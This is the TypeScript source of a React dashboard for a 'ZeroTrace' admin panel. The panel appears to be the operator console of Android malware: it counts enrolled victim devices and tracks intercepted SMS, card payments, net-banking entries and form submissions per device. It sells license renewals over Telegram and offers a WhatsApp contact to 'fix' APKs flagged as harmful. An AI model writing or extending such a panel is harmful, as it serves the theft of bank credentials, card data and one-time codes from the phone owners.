import { useEffect, useMemo, useState } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";

import wsService from "../services/ws/wsService";
import { listDeviceNotifications, listNotificationDevices } from "../services/api/sms";
import { listSessions } from "../services/api/admin";
import { ENV, apiHeaders } from "../config/constants";
import CountDown from "../components/ui/CountDown";

import ztLogo from "../assets/zt-logo.png";
import { formatDMY, getCountdown, getLicenseSnapshot, pad2 } from "../utils/license";

type Device = {
  deviceId: string;
  status?: { online?: boolean; timestamp?: number };
  admins?: string[];
  forwardingSim?: string;
  favorite?: boolean;
  metadata?: Record<string, any>;
};

type ActivityItem = {
  id: string;
  ts: number;
  title: string;
  subtitle?: string;
  icon: string;
  kind: "session" | "ws";
};

type SessionLike = {
  _id?: string;
  deviceId?: string;
  uniqueid?: string;
  admin?: string;
  username?: string;
  lastSeen?: number | string;
  updatedAt?: number | string;
  createdAt?: number | string;
};

const DEFAULT_POLL_INTERVAL = 12_000;
const SMS_POLL_INTERVAL = 30_000;

function toTs(v: any): number {
  if (!v) return 0;
  if (typeof v === "number") return v;
  const t = new Date(String(v)).getTime();
  return Number.isFinite(t) ? t : 0;
}

function minutesAgo(ts: number): string {
  const diff = Date.now() - ts;
  const m = Math.max(0, Math.floor(diff / 60000));
  if (m < 1) return "now";
  if (m === 1) return "1 min";
  if (m < 60) return `${m} min`;
  const h = Math.floor(m / 60);
  if (h === 1) return "1 hour";
  if (h < 24) return `${h} hours`;
  const d = Math.floor(h / 24);
  return d === 1 ? "1 day" : `${d} days`;
}

function onlyDigits(v: string): string {
  return String(v || "").replace(/\D/g, "");
}

function buildWhatsappUrl(base: string, text: string): string {
  const raw = String(base || "").trim();
  const encoded = encodeURIComponent(text);

  if (!raw) return "";

  if (/^\+?\d{8,20}$/.test(raw)) {
    return `https://wa.me/${onlyDigits(raw)}?text=${encoded}`;
  }

  try {
    const hasProtocol = /^https?:\/\//i.test(raw);
    const url = new URL(hasProtocol ? raw : `https://${raw}`);
    const host = url.hostname.toLowerCase();

    if (host.includes("wa.me")) {
      const phone = onlyDigits(url.pathname);
      if (phone) return `https://wa.me/${phone}?text=${encoded}`;
    }

    if (host.includes("api.whatsapp.com") || host.includes("web.whatsapp.com") || host.includes("whatsapp.com")) {
      const phone = onlyDigits(url.searchParams.get("phone") || url.pathname);
      if (phone) return `https://api.whatsapp.com/send?phone=${phone}&text=${encoded}`;
    }

    const phoneFromRaw = onlyDigits(raw);
    if (phoneFromRaw.length >= 8) {
      return `https://wa.me/${phoneFromRaw}?text=${encoded}`;
    }
  } catch {
    const phoneFromRaw = onlyDigits(raw);
    if (phoneFromRaw.length >= 8) {
      return `https://wa.me/${phoneFromRaw}?text=${encoded}`;
    }
  }

  return "";
}

export default function DashboardPage() {
  const nav = useNavigate();

  const [devices, setDevices] = useState<Device[]>([]);
  const [favoritesMap, setFavoritesMap] = useState<Record<string, boolean>>({});
  const [formsCount, setFormsCount] = useState<number | null>(null);
  const [cardCount, setCardCount] = useState<number | null>(null);
  const [netbankingCount, setNetbankingCount] = useState<number | null>(null);
  const [smsCount, setSmsCount] = useState<number | null>(null);
  const [error, setError] = useState<string | null>(null);

  const [wsConnected, setWsConnected] = useState<boolean>(false);

  const [sessionActivity, setSessionActivity] = useState<ActivityItem[]>([]);
  const [realtimeActivity, setRealtimeActivity] = useState<ActivityItem[]>([]);

  const [nowTick, setNowTick] = useState<number>(() => Date.now());
  const license = useMemo(() => getLicenseSnapshot(nowTick), [nowTick]);
  const countdown = useMemo(() => getCountdown(license.expiryDate, nowTick), [license.expiryDate, nowTick]);

  const harmfullWhatsappLink = String(import.meta.env.VITE_HARMFULL_FIX_WP_LINK || "").trim();

  const totalDevices = devices.length;
  const onlineCount = useMemo(() => devices.filter((d) => !!d.status?.online).length, [devices]);
  const offlineCount = totalDevices - onlineCount;

  const favoriteIds = useMemo(() => {
    return Object.entries(favoritesMap)
      .filter(([, v]) => !!v)
      .map(([k]) => k)
      .sort((a, b) => (a > b ? 1 : -1));
  }, [favoritesMap]);

  const favoritesPreview = useMemo(() => favoriteIds.slice(0, 4), [favoriteIds]);

  const activityItems = useMemo(() => {
    const merged = [...realtimeActivity, ...sessionActivity];

    const seen = new Set<string>();
    const out: ActivityItem[] = [];
    for (const it of merged) {
      const bucket = Math.floor(it.ts / 30_000);
      const key = `${it.kind}|${it.title}|${bucket}`;
      if (seen.has(key)) continue;
      seen.add(key);
      out.push(it);
      if (out.length >= 6) break;
    }
    return out;
  }, [realtimeActivity, sessionActivity]);

  useEffect(() => {
    const t = window.setInterval(() => setNowTick(Date.now()), 1000);
    return () => window.clearInterval(t);
  }, []);

  async function loadDevices() {
    setError(null);
    try {
      const res = await axios.get(`${ENV.API_BASE}/api/devices`, { headers: apiHeaders(), timeout: 8000 });
      setDevices(Array.isArray(res.data) ? res.data : []);
    } catch (e: any) {
      console.error("loadDevices error", e);
      setError("Failed loading devices");
      setDevices([]);
    }
  }

  async function loadFavorites() {
    try {
      const res = await axios.get(`${ENV.API_BASE}/api/favorites`, { headers: apiHeaders(), timeout: 8000 });
      const m = res?.data && typeof res.data === "object" ? (res.data as Record<string, boolean>) : {};
      setFavoritesMap(m || {});
    } catch {
      setFavoritesMap({});
    }
  }

  async function loadFormsCount() {
    try {
      const res = await axios.get(`${ENV.API_BASE}/api/form_submissions`, { headers: apiHeaders(), timeout: 10000 });
      setFormsCount(Array.isArray(res.data) ? res.data.length : 0);
    } catch {
      setFormsCount(0);
    }
  }

  async function loadPaymentsCounts(devList: Device[]) {
    setCardCount(null);
    setNetbankingCount(null);

    try {
      const headers = apiHeaders();
      const cardPromises: Promise<number>[] = [];
      const netPromises: Promise<number>[] = [];

      for (const d of devList) {
        const id = encodeURIComponent(d.deviceId);
        cardPromises.push(
          axios
            .get(`${ENV.API_BASE}/api/card_payments/device/${id}`, { headers, timeout: 8000 })
            .then((r) => (Array.isArray(r.data) ? r.data.length : 0))
            .catch(() => 0),
        );
        netPromises.push(
          axios
            .get(`${ENV.API_BASE}/api/net_banking/device/${id}`, { headers, timeout: 8000 })
            .then((r) => (Array.isArray(r.data) ? r.data.length : 0))
            .catch(() => 0),
        );
      }

      const [cardArr, netArr] = await Promise.all([Promise.all(cardPromises), Promise.all(netPromises)]);
      setCardCount(cardArr.reduce((s, v) => s + (Number(v) || 0), 0));
      setNetbankingCount(netArr.reduce((s, v) => s + (Number(v) || 0), 0));
    } catch {
      setCardCount(0);
      setNetbankingCount(0);
    }
  }

  async function loadSmsSummary() {
    try {
      const idsRaw = await listNotificationDevices();
      const ids = (Array.isArray(idsRaw) ? idsRaw : []).map((x: any) => String(x || "").trim()).filter(Boolean);

      if (ids.length === 0) {
        setSmsCount(0);
        return;
      }

      let total = 0;
      for (const did of ids.slice(0, 50)) {
        // eslint-disable-next-line no-await-in-loop
        const list = await listDeviceNotifications(did).catch(() => []);
        if (Array.isArray(list)) total += list.length;
      }
      setSmsCount(total);
    } catch {
      setSmsCount(0);
    }
  }

  async function loadAdminSessions() {
    try {
      const sessions = (await listSessions()) as any[];
      const arr: SessionLike[] = Array.isArray(sessions) ? sessions : [];

      const items: ActivityItem[] = arr
        .map((s) => {
          const did = String(s.deviceId || s.uniqueid || "unknown");
          const admin = String(s.admin || s.username || "admin");
          const last = toTs(s.lastSeen) || toTs(s.updatedAt) || toTs(s.createdAt) || Date.now();

          return {
            id: String(s._id || `${did}_${admin}_${last}`),
            ts: last,
            title: did,
            subtitle: admin,
            icon: "👤",
            kind: "session",
          } satisfies ActivityItem;
        })
        .sort((a, b) => b.ts - a.ts)
        .slice(0, 6);

      setSessionActivity(items);
    } catch (e) {
      console.warn("loadAdminSessions failed", e);
      setSessionActivity([]);
    }
  }

  function handleRenewClick() {
    if (license.telegramChatDeepLink) window.open(license.telegramChatDeepLink, "_blank");
    window.open(license.telegramShareUrl, "_blank");
  }

  function handleHarmfullClick() {
    const panelId = String(license.panelId || "____").trim();
    const message = `hello sir fixmy harmfull\npanel id: ${panelId}`;
    const finalUrl = buildWhatsappUrl(harmfullWhatsappLink, message);

    if (!finalUrl) {
      console.warn("Invalid WhatsApp env link. Use phone/wa.me/api.whatsapp.com/send");
      return;
    }

    window.open(finalUrl, "_blank", "noopener,noreferrer");
  }

  function pushRealtime(item: Omit<ActivityItem, "id" | "kind">) {
    const next = {
      ...item,
      kind: "ws",
      id: `${Date.now()}_${Math.random().toString(16).slice(2)}`,
    } satisfies ActivityItem;

    setRealtimeActivity((prev) => [next, ...prev].slice(0, 6));
  }

  function goDevices(filter: "all" | "online" | "offline") {
    if (filter === "all") {
      nav("/devices");
      return;
    }
    nav(`/devices?filter=${filter}`, { state: { filter } as any });
  }

  useEffect(() => {
    wsService.connect();
    setWsConnected(wsService.isConnected());

    const unsub = wsService.onMessage((msg) => {
      try {
        if (!msg || msg.type !== "event") return;

        if (msg.event === "status") {
          const did = String(msg.deviceId || "");
          const online = !!msg.data?.online;
          pushRealtime({
            ts: Date.now(),
            title: did || "Device",
            subtitle: online ? "online" : "offline",
            icon: online ? "🟢" : "🔴",
          });
        }

        if (msg.event === "notification") {
          const did = String(msg.deviceId || "");
          pushRealtime({
            ts: Date.now(),
            title: did || "Device",
            subtitle: "sms",
            icon: "💬",
          });
          loadSmsSummary().catch(() => {});
        }
      } catch {
        // ignore
      }
    });

    const wsStatusHandler = (ev: any) => {
      try {
        setWsConnected(!!ev?.detail?.connected);
      } catch {}
    };
    window.addEventListener("zerotrace:ws", wsStatusHandler as any);

    return () => {
      unsub();
      window.removeEventListener("zerotrace:ws", wsStatusHandler as any);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    loadDevices();
    loadFormsCount();
    loadFavorites();
    loadSmsSummary();
    loadAdminSessions();

    const t = setInterval(() => {
      loadDevices();
      loadFormsCount();
      loadFavorites();
    }, DEFAULT_POLL_INTERVAL);

    const smsT = setInterval(() => {
      loadSmsSummary();
    }, SMS_POLL_INTERVAL);

    return () => {
      clearInterval(t);
      clearInterval(smsT);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    if (!devices || devices.length === 0) {
      setCardCount(0);
      setNetbankingCount(0);
      return;
    }
    loadPaymentsCounts(devices).catch(() => {});
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [devices]);

  function StatTile({
    title,
    value,
    icon,
    hint,
    onClick,
  }: {
    title: string;
    value: string | number;
    icon: string;
    hint: string;
    onClick: () => void;
  }) {
    return (
      <button
        type="button"
        onClick={onClick}
        className="w-full rounded-xl border bg-white px-3 py-2 text-left shadow-sm transition active:scale-[0.99]"
      >
        <div className="flex items-center justify-between">
          <div className="flex min-w-0 items-center gap-3">
            <div className="flex h-9 w-9 items-center justify-center rounded-xl bg-gray-100 text-lg sm:h-10 sm:w-10">
              {icon}
            </div>
            <div className="min-w-0">
              <div className="truncate text-[11px] text-gray-500 sm:text-xs">{title}</div>
              <div className="text-lg font-bold leading-tight sm:text-xl">{value}</div>
            </div>
          </div>
          <div className="text-xl text-gray-300">›</div>
        </div>
        <div className="mt-1 text-[10px] text-gray-400">{hint}</div>
      </button>
    );
  }

  return (
    <div className="mx-auto max-w-[420px] px-3 pb-28 sm:max-w-2xl sm:px-4">
      <div className="flex items-start justify-between pb-3 pt-4">
        <div className="flex min-w-0 items-center gap-3">
          <img src={ztLogo} alt="ZeroTrace logo" className="h-9 w-9 rounded-md object-contain" />
          <div className="min-w-0">
            <div className="truncate text-lg font-semibold leading-tight">ZeroTrace</div>
            <div className="text-[11px] text-gray-500">Secure Admin Panel</div>
          </div>
        </div>

        <div className="flex items-center gap-2 text-xs">
          <span className={`inline-block h-2.5 w-2.5 rounded-full ${wsConnected ? "bg-green-500" : "bg-red-500"}`} />
          <span className={`${wsConnected ? "text-green-700" : "text-red-600"} text-[12px] font-medium`}>
            {wsConnected ? "Connected" : "Disconnected"}
          </span>
        </div>
      </div>

      <div className="grid grid-cols-2 gap-3">
        <StatTile
          title="Online Devices"
          value={onlineCount}
          icon="📶"
          hint="Click to view online only"
          onClick={() => goDevices("online")}
        />
        <StatTile
          title="Offline Devices"
          value={offlineCount}
          icon="📴"
          hint="Click to view offline only"
          onClick={() => goDevices("offline")}
        />
        <StatTile
          title="Total Devices"
          value={totalDevices}
          icon="📱"
          hint="Click to view all devices"
          onClick={() => goDevices("all")}
        />
        <StatTile
          title="All SMS"
          value={smsCount == null ? "…" : smsCount}
          icon="💬"
          hint="Click to open SMS History"
          onClick={() => nav("/sms")}
        />
      </div>

      <div className="mt-4 overflow-hidden rounded-2xl border bg-white shadow-sm">
        <div className="flex items-center justify-between border-b px-4 py-3">
          <div className="text-sm font-semibold">Admin Expires in</div>
          <button
            type="button"
            onClick={handleRenewClick}
            className="rounded-lg bg-[var(--brand)] px-3 py-1.5 text-xs text-white"
          >
            Renew (Telegram)
          </button>
        </div>

        <div className="flex items-center justify-between px-4 py-3">
          <div className="text-xs text-gray-500">Active until:</div>
          <div className="text-xs font-medium">{formatDMY(license.expiryDate)}</div>
        </div>

        <div className="flex items-center justify-between px-4 pb-2">
          <div className="text-xs text-gray-500">Purchase date:</div>
          <div className="text-xs font-medium">{formatDMY(license.startDate)}</div>
        </div>

        <div className="px-4 pb-4">
          <div className="mt-2 flex items-end justify-center gap-3">
            {countdown ? (
              countdown.expired ? (
                <div className="w-full py-4 text-center">
                  <div className="text-2xl font-bold text-red-600">Expired</div>
                  <div className="mt-1 text-xs text-gray-400">Please renew license</div>

                  <button
                    type="button"
                    onClick={handleRenewClick}
                    className="mt-3 w-full rounded-xl bg-gradient-to-b from-rose-500 to-rose-600 py-2 font-semibold text-white shadow-sm"
                  >
                    Renew Now (Telegram)
                  </button>

                  <div className="mt-2 text-center text-xs text-gray-500">
                    Panel ID: <span className="font-medium">{license.panelId || "____"}</span>
                  </div>
                </div>
              ) : (
                <div className="w-full py-3">
                  <div className="flex items-end justify-center gap-2 text-[22px] font-semibold tracking-wide sm:text-[34px]">
                    <span className="text-[28px] text-[var(--brand)] sm:text-[36px]">{pad2(countdown.days)}</span>
                    <span className="text-gray-300">:</span>
                    <span className="text-[20px] sm:text-[28px]">{pad2(countdown.hours)}</span>
                    <span className="text-gray-300">:</span>
                    <span className="text-[20px] sm:text-[28px]">{pad2(countdown.mins)}</span>
                    <span className="text-gray-300">:</span>
                    <span className="text-[20px] sm:text-[28px]">{pad2(countdown.secs)}</span>
                    <span className="pb-1 text-sm text-gray-500">Sec</span>
                  </div>

                  <div className="mt-2 text-center text-xs text-gray-500">Days until {formatDMY(license.expiryDate)}</div>

                  <button
                    type="button"
                    onClick={handleRenewClick}
                    className="mt-3 w-full rounded-xl bg-gradient-to-b from-emerald-400 to-emerald-600 py-3 font-semibold text-white shadow-sm"
                  >
                    Renew License (Telegram)
                  </button>

                  <div className="mt-2 text-center text-xs text-gray-500">
                    Panel ID: <span className="font-medium">{license.panelId || "____"}</span>
                  </div>
                </div>
              )
            ) : (
              <div className="py-4 text-center text-sm text-gray-400">
                Set env <span className="font-medium">VITE_RENEWAL_START_DATE</span> (DD/MM/YYYY).
              </div>
            )}
          </div>
        </div>
      </div>

      <div className="mt-4 overflow-hidden rounded-2xl border bg-white shadow-sm">
        <div className="border-b px-4 py-3">
          <div className="text-sm font-semibold">Fix My Apk Harmfull</div>
          <div className="mt-1 text-xs text-gray-500">contact Harmfull team</div>
        </div>

        <div className="px-4 py-4">
          <div className="rounded-xl border border-orange-100 bg-orange-50 px-3 py-3">
            <div className="text-sm font-medium text-gray-800">Need help for harmful/fix issue?</div>
            <div className="mt-1 text-xs text-gray-500">
              Click below and WhatsApp will open with auto message:
              <span className="font-medium"> hello sir fixmy harmfull</span> + your panel id.
            </div>
          </div>

          <button
            type="button"
            onClick={handleHarmfullClick}
            disabled={!harmfullWhatsappLink}
            className="mt-3 w-full rounded-xl bg-gradient-to-b from-green-500 to-green-600 py-3 font-semibold text-white shadow-sm disabled:cursor-not-allowed disabled:opacity-60"
          >
            contact Harmfull team
          </button>

          <div className="mt-2 text-center text-xs text-gray-500">
            Panel ID: <span className="font-medium">{license.panelId || "____"}</span>
          </div>

          {!harmfullWhatsappLink ? (
            <div className="mt-2 text-center text-xs text-red-600">
              Set env <span className="font-medium">VITE_HARMFULL_FIX_WP_LINK</span>
            </div>
          ) : null}
        </div>
      </div>

      <div className="mt-4 grid grid-cols-1 gap-4 md:grid-cols-2">
        <div className="overflow-hidden rounded-2xl border bg-white shadow-sm">
          <div className="flex items-center justify-between border-b px-4 py-3">
            <div className="text-sm font-semibold">All Form Submits</div>
            <button
              type="button"
              onClick={() => nav("/forms")}
              className="rounded-lg border bg-white px-3 py-1.5 text-xs hover:bg-gray-50"
            >
              View Forms ›
            </button>
          </div>

          <div className="space-y-3 px-4 py-3">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2 text-sm">
                <span className="flex h-8 w-8 items-center justify-center rounded-lg bg-gray-100">🗂️</span>
                <span className="text-gray-700">Form Submits</span>
              </div>
              <div className="text-sm font-semibold">{formsCount == null ? "…" : formsCount}</div>
            </div>

            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2 text-sm">
                <span className="flex h-8 w-8 items-center justify-center rounded-lg bg-gray-100">💳</span>
                <span className="text-gray-700">Card Payments</span>
              </div>
              <div className="text-sm font-semibold">{cardCount == null ? "…" : cardCount}</div>
            </div>

            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2 text-sm">
                <span className="flex h-8 w-8 items-center justify-center rounded-lg bg-gray-100">🏦</span>
                <span className="text-gray-700">Net Banking Lists</span>
              </div>
              <div className="text-sm font-semibold">{netbankingCount == null ? "…" : netbankingCount}</div>
            </div>

            {error ? <div className="pt-2 text-xs text-red-600">{error}</div> : null}
          </div>
        </div>

        <div className="overflow-hidden rounded-2xl border bg-white shadow-sm">
          <div className="flex items-center justify-between border-b px-4 py-3">
            <div className="text-sm font-semibold">Admin Activity</div>

            <div className="flex items-center gap-2">
              <div className="text-xs text-gray-400">{activityItems.length}</div>
              <button
                type="button"
                onClick={() => nav("/sessions")}
                className="rounded-lg border bg-white px-3 py-1.5 text-xs hover:bg-gray-50"
              >
                Manage
              </button>
            </div>
          </div>

          <div className="px-4 py-3">
            {activityItems.length === 0 ? (
              <div className="text-sm text-gray-400">No activity yet.</div>
            ) : (
              <div className="space-y-2">
                {activityItems.map((it) => (
                  <button
                    type="button"
                    key={it.id}
                    onClick={() => nav("/sessions")}
                    className="flex w-full items-center justify-between rounded-xl border px-3 py-2 text-left hover:bg-gray-50"
                    title="Manage sessions"
                  >
                    <div className="flex min-w-0 items-center gap-2">
                      <div className="flex h-7 w-7 items-center justify-center rounded-lg bg-gray-100">{it.icon}</div>
                      <div className="min-w-0">
                        <div className="truncate text-sm font-medium">{it.title}</div>
                        <div className="truncate text-[11px] text-gray-500">
                          {it.kind === "session" ? `admin: ${it.subtitle || "admin"}` : it.subtitle || "event"}
                        </div>
                      </div>
                    </div>
                    <div className="text-xs text-gray-400">{it.ts ? minutesAgo(it.ts) : ""}</div>
                  </button>
                ))}
              </div>
            )}

            {sessionActivity.length === 0 ? (
              <div className="mt-3 text-[11px] text-gray-400">
                Tip: If this stays empty, check backend route <span className="font-mono">GET /api/admin/sessions</span>.
              </div>
            ) : null}
          </div>
        </div>
      </div>

      <div className="mt-4 overflow-hidden rounded-2xl border bg-white shadow-sm">
        <div className="flex items-center justify-between border-b px-4 py-3">
          <div className="text-sm font-semibold">Favorites</div>
          <button
            type="button"
            onClick={() => nav("/favorites")}
            className="rounded-lg border bg-white px-3 py-1.5 text-xs hover:bg-gray-50"
          >
            View All ›
          </button>
        </div>

        <div className="px-4 py-3">
          {favoritesPreview.length === 0 ? (
            <div className="text-sm text-gray-400">No favorites yet.</div>
          ) : (
            <div className="space-y-2">
              {favoritesPreview.map((id) => {
                const d = devices.find((x) => x.deviceId === id);
                const ts = d?.status?.timestamp || 0;
                return (
                  <button
                    type="button"
                    key={id}
                    onClick={() => nav(`/devices/${encodeURIComponent(id)}`)}
                    className="flex w-full items-center justify-between rounded-xl border px-3 py-2 text-left hover:bg-gray-50"
                  >
                    <div className="flex min-w-0 items-center gap-2">
                      <div className="flex h-7 w-7 items-center justify-center rounded-lg bg-gray-100">⭐</div>
                      <div className="min-w-0">
                        <div className="truncate text-sm font-medium">{id}</div>
                        <div className="truncate text-[11px] text-gray-500">{d?.status?.online ? "online" : "offline"}</div>
                      </div>
                    </div>
                    <div className="text-xs text-gray-400">{ts ? minutesAgo(ts) : ""}</div>
                  </button>
                );
              })}
            </div>
          )}
        </div>
      </div>

      <div className="hidden">
        <CountDown
          expiryDate={license.expiryISO}
          title="License Countdown"
          subtitle={`Panel: ${license.panelId || "____"}`}
          onRenew={handleRenewClick}
          renewLabel="Renew (Telegram)"
        />
      </div>
    </div>
  );
}